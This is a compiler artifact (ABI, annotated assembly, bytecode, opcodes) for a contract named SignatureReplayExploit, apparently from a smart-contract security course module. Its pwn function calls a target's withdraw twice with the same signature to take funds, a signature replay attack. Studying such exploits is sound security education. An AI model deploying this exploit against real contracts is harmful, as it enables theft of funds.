{
	"Modules/Security/12. Signature Replay Attack.sol": {
		"SignatureReplayExploit": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_target",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "bytes32",
							"name": "r",
							"type": "bytes32"
						},
						{
							"internalType": "bytes32",
							"name": "s",
							"type": "bytes32"
						},
						{
							"internalType": "uint8",
							"name": "v",
							"type": "uint8"
						}
					],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"Modules/Security/12. Signature Replay Attack.sol\":1313:1678  contract SignatureReplayExploit {... */\n  mstore(0x40, 0xa0)\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1391:1471  constructor(address _target) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1456:1463  _target */\n  dup1\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1430:1464  target = ISignatureReplay(_target) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1391:1471  constructor(address _target) {... */\n  pop\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1313:1678  contract SignatureReplayExploit {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"Modules/Security/12. Signature Replay Attack.sol\":1313:1678  contract SignatureReplayExploit {... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x0330c0d84464f890f3c81afbba7a3a05e0e864ec2e31676dedcb075b2bf855a0\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1313:1678  contract SignatureReplayExploit {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6ed87507\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1512:1676  function pwn(bytes32 r, bytes32 s, uint8 v) external {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_6\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_6:\n      pop\n      tag_7\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      tag_10\n      jump\t// in\n    tag_7:\n      stop\n    tag_10:\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1575:1581  target */\n      immutable(\"0x0330c0d84464f890f3c81afbba7a3a05e0e864ec2e31676dedcb075b2bf855a0\")\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1575:1590  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x197917e7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1591:1601  msg.sender */\n      caller\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1603:1607  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1609:1610  r */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1612:1613  s */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1615:1616  v */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1575:1617  target.withdraw(msg.sender, 1e18, r, s, v) */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap6\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1627:1633  target */\n      immutable(\"0x0330c0d84464f890f3c81afbba7a3a05e0e864ec2e31676dedcb075b2bf855a0\")\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1627:1642  target.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x197917e7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1643:1653  msg.sender */\n      caller\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1655:1659  1e18 */\n      0x0de0b6b3a7640000\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1661:1662  r */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1664:1665  s */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1667:1668  v */\n      dup7\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1627:1669  target.withdraw(msg.sender, 1e18, r, s, v) */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap6\n      swap5\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_17:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n        /* \"Modules/Security/12. Signature Replay Attack.sol\":1512:1676  function pwn(bytes32 r, bytes32 s, uint8 v) external {... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_22:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_24:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_25:\n        /* \"#utility.yul\":490:514   */\n      tag_46\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_47\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      dup1\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_47:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_26:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_49\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_25\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:776   */\n    tag_27:\n        /* \"#utility.yul\":725:732   */\n      0x00\n        /* \"#utility.yul\":765:769   */\n      0xff\n        /* \"#utility.yul\":758:763   */\n      dup3\n        /* \"#utility.yul\":754:770   */\n      and\n        /* \"#utility.yul\":743:770   */\n      swap1\n      pop\n        /* \"#utility.yul\":690:776   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":782:900   */\n    tag_28:\n        /* \"#utility.yul\":853:875   */\n      tag_52\n        /* \"#utility.yul\":869:874   */\n      dup2\n        /* \"#utility.yul\":853:875   */\n      tag_27\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":846:851   */\n      dup2\n        /* \"#utility.yul\":843:876   */\n      eq\n        /* \"#utility.yul\":833:894   */\n      tag_53\n      jumpi\n        /* \"#utility.yul\":890:891   */\n      0x00\n        /* \"#utility.yul\":887:888   */\n      dup1\n        /* \"#utility.yul\":880:892   */\n      revert\n        /* \"#utility.yul\":833:894   */\n    tag_53:\n        /* \"#utility.yul\":782:900   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":906:1041   */\n    tag_29:\n        /* \"#utility.yul\":950:955   */\n      0x00\n        /* \"#utility.yul\":988:994   */\n      dup2\n        /* \"#utility.yul\":975:995   */\n      calldataload\n        /* \"#utility.yul\":966:995   */\n      swap1\n      pop\n        /* \"#utility.yul\":1004:1035   */\n      tag_55\n        /* \"#utility.yul\":1029:1034   */\n      dup2\n        /* \"#utility.yul\":1004:1035   */\n      tag_28\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":906:1041   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1047:1662   */\n    tag_9:\n        /* \"#utility.yul\":1122:1128   */\n      0x00\n        /* \"#utility.yul\":1130:1136   */\n      dup1\n        /* \"#utility.yul\":1138:1144   */\n      0x00\n        /* \"#utility.yul\":1187:1189   */\n      0x60\n        /* \"#utility.yul\":1175:1184   */\n      dup5\n        /* \"#utility.yul\":1166:1173   */\n      dup7\n        /* \"#utility.yul\":1162:1185   */\n      sub\n        /* \"#utility.yul\":1158:1190   */\n      slt\n        /* \"#utility.yul\":1155:1274   */\n      iszero\n      tag_57\n      jumpi\n        /* \"#utility.yul\":1193:1272   */\n      tag_58\n      tag_22\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1155:1274   */\n    tag_57:\n        /* \"#utility.yul\":1313:1314   */\n      0x00\n        /* \"#utility.yul\":1338:1391   */\n      tag_59\n        /* \"#utility.yul\":1383:1390   */\n      dup7\n        /* \"#utility.yul\":1374:1380   */\n      dup3\n        /* \"#utility.yul\":1363:1372   */\n      dup8\n        /* \"#utility.yul\":1359:1381   */\n      add\n        /* \"#utility.yul\":1338:1391   */\n      tag_26\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1328:1391   */\n      swap4\n      pop\n        /* \"#utility.yul\":1284:1401   */\n      pop\n        /* \"#utility.yul\":1440:1442   */\n      0x20\n        /* \"#utility.yul\":1466:1519   */\n      tag_60\n        /* \"#utility.yul\":1511:1518   */\n      dup7\n        /* \"#utility.yul\":1502:1508   */\n      dup3\n        /* \"#utility.yul\":1491:1500   */\n      dup8\n        /* \"#utility.yul\":1487:1509   */\n      add\n        /* \"#utility.yul\":1466:1519   */\n      tag_26\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1456:1519   */\n      swap3\n      pop\n        /* \"#utility.yul\":1411:1529   */\n      pop\n        /* \"#utility.yul\":1568:1570   */\n      0x40\n        /* \"#utility.yul\":1594:1645   */\n      tag_61\n        /* \"#utility.yul\":1637:1644   */\n      dup7\n        /* \"#utility.yul\":1628:1634   */\n      dup3\n        /* \"#utility.yul\":1617:1626   */\n      dup8\n        /* \"#utility.yul\":1613:1635   */\n      add\n        /* \"#utility.yul\":1594:1645   */\n      tag_29\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1584:1645   */\n      swap2\n      pop\n        /* \"#utility.yul\":1539:1655   */\n      pop\n        /* \"#utility.yul\":1047:1662   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":1668:1794   */\n    tag_30:\n        /* \"#utility.yul\":1705:1712   */\n      0x00\n        /* \"#utility.yul\":1745:1787   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1738:1743   */\n      dup3\n        /* \"#utility.yul\":1734:1788   */\n      and\n        /* \"#utility.yul\":1723:1788   */\n      swap1\n      pop\n        /* \"#utility.yul\":1668:1794   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1800:1896   */\n    tag_31:\n        /* \"#utility.yul\":1837:1844   */\n      0x00\n        /* \"#utility.yul\":1866:1890   */\n      tag_64\n        /* \"#utility.yul\":1884:1889   */\n      dup3\n        /* \"#utility.yul\":1866:1890   */\n      tag_30\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1855:1890   */\n      swap1\n      pop\n        /* \"#utility.yul\":1800:1896   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1902:2020   */\n    tag_32:\n        /* \"#utility.yul\":1989:2013   */\n      tag_66\n        /* \"#utility.yul\":2007:2012   */\n      dup2\n        /* \"#utility.yul\":1989:2013   */\n      tag_31\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1984:1987   */\n      dup3\n        /* \"#utility.yul\":1977:2014   */\n      mstore\n        /* \"#utility.yul\":1902:2020   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2026:2129   */\n    tag_33:\n        /* \"#utility.yul\":2089:2096   */\n      0x00\n        /* \"#utility.yul\":2118:2123   */\n      dup2\n        /* \"#utility.yul\":2107:2123   */\n      swap1\n      pop\n        /* \"#utility.yul\":2026:2129   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2135:2212   */\n    tag_34:\n        /* \"#utility.yul\":2172:2179   */\n      0x00\n        /* \"#utility.yul\":2201:2206   */\n      dup2\n        /* \"#utility.yul\":2190:2206   */\n      swap1\n      pop\n        /* \"#utility.yul\":2135:2212   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2218:2278   */\n    tag_35:\n        /* \"#utility.yul\":2246:2249   */\n      0x00\n        /* \"#utility.yul\":2267:2272   */\n      dup2\n        /* \"#utility.yul\":2260:2272   */\n      swap1\n      pop\n        /* \"#utility.yul\":2218:2278   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2284:2478   */\n    tag_36:\n        /* \"#utility.yul\":2360:2369   */\n      0x00\n        /* \"#utility.yul\":2393:2472   */\n      tag_71\n        /* \"#utility.yul\":2411:2471   */\n      tag_72\n        /* \"#utility.yul\":2420:2470   */\n      tag_73\n        /* \"#utility.yul\":2464:2469   */\n      dup5\n        /* \"#utility.yul\":2420:2470   */\n      tag_33\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2411:2471   */\n      tag_35\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2393:2472   */\n      tag_34\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2380:2472   */\n      swap1\n      pop\n        /* \"#utility.yul\":2284:2478   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2484:2667   */\n    tag_37:\n        /* \"#utility.yul\":2597:2660   */\n      tag_75\n        /* \"#utility.yul\":2654:2659   */\n      dup2\n        /* \"#utility.yul\":2597:2660   */\n      tag_36\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2592:2595   */\n      dup3\n        /* \"#utility.yul\":2585:2661   */\n      mstore\n        /* \"#utility.yul\":2484:2667   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2673:2791   */\n    tag_38:\n        /* \"#utility.yul\":2760:2784   */\n      tag_77\n        /* \"#utility.yul\":2778:2783   */\n      dup2\n        /* \"#utility.yul\":2760:2784   */\n      tag_24\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2755:2758   */\n      dup3\n        /* \"#utility.yul\":2748:2785   */\n      mstore\n        /* \"#utility.yul\":2673:2791   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2797:2909   */\n    tag_39:\n        /* \"#utility.yul\":2880:2902   */\n      tag_79\n        /* \"#utility.yul\":2896:2901   */\n      dup2\n        /* \"#utility.yul\":2880:2902   */\n      tag_27\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2875:2878   */\n      dup3\n        /* \"#utility.yul\":2868:2903   */\n      mstore\n        /* \"#utility.yul\":2797:2909   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2915:3623   */\n    tag_13:\n        /* \"#utility.yul\":3142:3146   */\n      0x00\n        /* \"#utility.yul\":3180:3183   */\n      0xa0\n        /* \"#utility.yul\":3169:3178   */\n      dup3\n        /* \"#utility.yul\":3165:3184   */\n      add\n        /* \"#utility.yul\":3157:3184   */\n      swap1\n      pop\n        /* \"#utility.yul\":3194:3265   */\n      tag_81\n        /* \"#utility.yul\":3262:3263   */\n      0x00\n        /* \"#utility.yul\":3251:3260   */\n      dup4\n        /* \"#utility.yul\":3247:3264   */\n      add\n        /* \"#utility.yul\":3238:3244   */\n      dup9\n        /* \"#utility.yul\":3194:3265   */\n      tag_32\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":3275:3373   */\n      tag_82\n        /* \"#utility.yul\":3369:3371   */\n      0x20\n        /* \"#utility.yul\":3358:3367   */\n      dup4\n        /* \"#utility.yul\":3354:3372   */\n      add\n        /* \"#utility.yul\":3345:3351   */\n      dup8\n        /* \"#utility.yul\":3275:3373   */\n      tag_37\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":3383:3455   */\n      tag_83\n        /* \"#utility.yul\":3451:3453   */\n      0x40\n        /* \"#utility.yul\":3440:3449   */\n      dup4\n        /* \"#utility.yul\":3436:3454   */\n      add\n        /* \"#utility.yul\":3427:3433   */\n      dup7\n        /* \"#utility.yul\":3383:3455   */\n      tag_38\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":3465:3537   */\n      tag_84\n        /* \"#utility.yul\":3533:3535   */\n      0x60\n        /* \"#utility.yul\":3522:3531   */\n      dup4\n        /* \"#utility.yul\":3518:3536   */\n      add\n        /* \"#utility.yul\":3509:3515   */\n      dup6\n        /* \"#utility.yul\":3465:3537   */\n      tag_38\n      jump\t// in\n    tag_84:\n        /* \"#utility.yul\":3547:3616   */\n      tag_85\n        /* \"#utility.yul\":3611:3614   */\n      0x80\n        /* \"#utility.yul\":3600:3609   */\n      dup4\n        /* \"#utility.yul\":3596:3615   */\n      add\n        /* \"#utility.yul\":3587:3593   */\n      dup5\n        /* \"#utility.yul\":3547:3616   */\n      tag_39\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2915:3623   */\n      swap7\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212209e038d9e2096bc88e22338b43f391756d403da6e41cf38b5bf2d2ad736806d0464736f6c63430008160033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a060405234801561000f575f80fd5b50604051610482380380610482833981810160405281019061003191906100c9565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100f4565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100988261006f565b9050919050565b6100a88161008e565b81146100b2575f80fd5b50565b5f815190506100c38161009f565b92915050565b5f602082840312156100de576100dd61006b565b5b5f6100eb848285016100b5565b91505092915050565b6080516103716101115f395f81816056015260ec01526103715ff3fe608060405260043610610021575f3560e01c80636ed875071461002c57610028565b3661002857005b5f80fd5b348015610037575f80fd5b50610052600480360381019061004d91906101f2565b610054565b005b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663197917e733670de0b6b3a76400008686866040518663ffffffff1660e01b81526004016100bd9594939291906102ea565b5f604051808303815f87803b1580156100d4575f80fd5b505af11580156100e6573d5f803e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663197917e733670de0b6b3a76400008686866040518663ffffffff1660e01b81526004016101539594939291906102ea565b5f604051808303815f87803b15801561016a575f80fd5b505af115801561017c573d5f803e3d5ffd5b50505050505050565b5f80fd5b5f819050919050565b61019b81610189565b81146101a5575f80fd5b50565b5f813590506101b681610192565b92915050565b5f60ff82169050919050565b6101d1816101bc565b81146101db575f80fd5b50565b5f813590506101ec816101c8565b92915050565b5f805f6060848603121561020957610208610185565b5b5f610216868287016101a8565b9350506020610227868287016101a8565b9250506040610238868287016101de565b9150509250925092565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61026b82610242565b9050919050565b61027b81610261565b82525050565b5f819050919050565b5f819050919050565b5f819050919050565b5f6102b66102b16102ac84610281565b610293565b61028a565b9050919050565b6102c68161029c565b82525050565b6102d581610189565b82525050565b6102e4816101bc565b82525050565b5f60a0820190506102fd5f830188610272565b61030a60208301876102bd565b61031760408301866102cc565b61032460608301856102cc565b61033160808301846102db565b969550505050505056fea26469706673582212209e038d9e2096bc88e22338b43f391756d403da6e41cf38b5bf2d2ad736806d0464736f6c63430008160033",
					"opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x482 CODESIZE SUB DUP1 PUSH2 0x482 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xC9 JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0xF4 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x98 DUP3 PUSH2 0x6F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xA8 DUP2 PUSH2 0x8E JUMP JUMPDEST DUP2 EQ PUSH2 0xB2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xC3 DUP2 PUSH2 0x9F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xDE JUMPI PUSH2 0xDD PUSH2 0x6B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xEB DUP5 DUP3 DUP6 ADD PUSH2 0xB5 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0x371 PUSH2 0x111 PUSH0 CODECOPY PUSH0 DUP2 DUP2 PUSH1 0x56 ADD MSTORE PUSH1 0xEC ADD MSTORE PUSH2 0x371 PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x21 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x6ED87507 EQ PUSH2 0x2C JUMPI PUSH2 0x28 JUMP JUMPDEST CALLDATASIZE PUSH2 0x28 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x37 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x1F2 JUMP JUMPDEST PUSH2 0x54 JUMP JUMPDEST STOP JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x197917E7 CALLER PUSH8 0xDE0B6B3A7640000 DUP7 DUP7 DUP7 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xBD SWAP6 SWAP5 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xD4 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE6 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x197917E7 CALLER PUSH8 0xDE0B6B3A7640000 DUP7 DUP7 DUP7 PUSH1 0x40 MLOAD DUP7 